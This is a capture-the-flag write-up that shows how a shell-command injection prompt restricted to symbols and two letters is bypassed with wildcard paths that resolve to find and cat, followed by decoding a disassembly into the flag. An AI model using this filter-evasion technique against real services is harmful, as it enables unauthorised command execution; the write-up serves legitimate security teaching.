# Bashing your spirit foods

**Points:** 150 **Description:**

> You are not yourself when you are hungry. Have a CTF challenge and stop *bashing* people up.

## Solution

When you connect to the service you will be prompted if you are a person or hungry, if you choose hungry you will be then prompted again to choose one of two foods [n]achos or [f]ish. Choose either one and we will see this message at the bottom.

```
sh: 1: f: not found
```

Now we know that this prompt tries to execute what we enter as shell commands. After some testing we can see it allows only non alphanumeric characters and n and f to be entered. This is where wildcards come into play. 

`$ /???/??n/f?n?` (find)

`$ /???/???` (cat)

First we use the command find to see what files are in the current directory there is a file named f14g but that is not the flag and we get a hint like this.

> You thought this was going to be the flag!
> Real flag hidden somewhere in the system... HEH HEH HEH!
> Hint: The file has the word flag in it

So we use find to list all the files in the system we do this by entering 

`$ /???/??n/f?n? /`

and save the data into a file. Searching for the word flag in the file we find this

> /bin/thisisareallylongflagbutifyoucansomehowcatthisitwouldbeamazing

After catting it we get an assembler dump

> (gdb) disas main.Dump of assembler code for function main:.   0x00000000000006b0 <+0>:.push   rbp.   0x00000000000006b1 <+1>:.mov    rbp,rsp.   0x00000000000006b4 <+4>:.push   0x7d.   0x00000000000006b6 <+6>:.push   0x68.   0x00000000000006b8 <+8>:.push   0x37.   0x00000000000006ba <+10>:.push   0x6c.   0x00000000000006bc <+12>:.push   0x34.   0x00000000000006be <+14>:.push   0x33.   0x00000000000006c0 <+16>:.push   0x68.   0x00000000000006c2 <+18>:.push   0x5f.   0x00000000000006c4 <+20>:.push   0x72.   0x00000000000006c6 <+22>:.push   0x30.   0x00000000000006c8 <+24>:.push   0x66.   0x00000000000006ca <+26>:.push   0x5f.   0x00000000000006cc <+28>:.push   0x64.   0x00000000000006ce <+30>:.push   0x34.   0x00000000000006d0 <+32>:.push   0x62.   0x00000000000006d2 <+34>:.push   0x5f.   0x00000000000006d4 <+36>:.push   0x35.   0x00000000000006d6 <+38>:.push   0x31.   0x00000000000006d8 <+40>:.push   0x5f.   0x00000000000006da <+42>:.push   0x36.   0x00000000000006dc <+44>:.push   0x6e.   0x00000000000006de <+46>:.push   0x31.   0x00000000000006e0 <+48>:.push   0x68.   0x00000000000006e2 <+50>:.push   0x35.   0x00000000000006e4 <+52>:.push   0x34.   0x00000000000006e6 <+54>:.push   0x62.   0x00000000000006e8 <+56>:.mov    r9d,0x7b.   0x00000000000006ee <+62>:.mov    r8d,0x46.   0x00000000000006f4 <+68>:.mov    ecx,0x54.   0x00000000000006f9 <+73>:.mov    edx,0x43.   0x00000000000006fe <+78>:.mov    esi,0x47.   0x0000000000000703 <+83>:.lea    rdi,[rip+0xae]        # 0x7b8.   0x000000000000070a <+90>:.mov    eax,0x0.   0x000000000000070f <+95>:.call   0x560 <printf@plt>.   0x0000000000000714 <+100>:.add    rsp,0xd0.   0x000000000000071b <+107>:.mov    eax,0x0.   0x0000000000000720 <+112>:.leave  .   0x0000000000000721 <+113>:.ret    .End of assembler dump

The code here basically prints out the flag GCTF{b45h1n6\_15_b4d_f0r_h34l7h}.